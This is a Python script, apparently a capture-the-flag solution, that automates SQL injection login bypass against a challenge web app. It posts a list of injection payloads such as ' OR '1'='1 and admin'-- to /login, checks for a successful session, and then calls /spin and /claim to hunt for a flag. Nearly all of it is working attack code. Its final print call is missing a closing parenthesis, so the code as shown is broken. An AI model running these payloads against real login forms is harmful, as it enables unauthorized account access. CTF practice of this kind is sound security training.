import requests, string, random

base = 'https://web-random-cheese.tracebash.xyz'

# SQL injection in login
s = requests.Session()
r = s.post(f'{base}/login', data={'username': "' OR '1'='1", 'password': "' OR '1'='1"}, allow_redirects=False)
print('SQLi1:', r.status_code, r.headers.get('Location'))
if r.status_code == 302:
    r2 = s.get(f'{base}/')
    print('Logged in as:', 'Login' not in r2.text[:2000])
    # Check for flag
    if 'CTF' in r2.text or 'flag{' in r2.text:
        print('FLAG in response!')
        print(r2.text[:3000])

# Try union injection on login
payloads = [
    "admin'--",
    "admin'#",
    "admin'/*",
    "' OR 1=1--",
    "' OR '1'='1' --",
    "' UNION SELECT 1--",
    "admin' OR '1'='1",
    '" OR true --',
]
for p in payloads:
    s = requests.Session()
    r = s.post(f'{base}/login', data={'username': p, 'password': 'x'}, allow_redirects=False)
    if r.status_code == 302:
        r2 = s.get(f'{base}/')
        if 'Login' not in r2.text[:1000] and 'Register' not in r2.text[:1000]:
            print(f'SQLi SUCCESS with: {repr(p)}')
            # Check spins remaining
            r3 = s.post(f'{base}/spin')
            print('Spin result:', r3.text[:300])
            print('Has flag text:', 'flag' in r3.text.lower())
            # Try claim
            r4 = s.post(f'{base}/claim')
            print('Claim:', r4.text[:500]
            break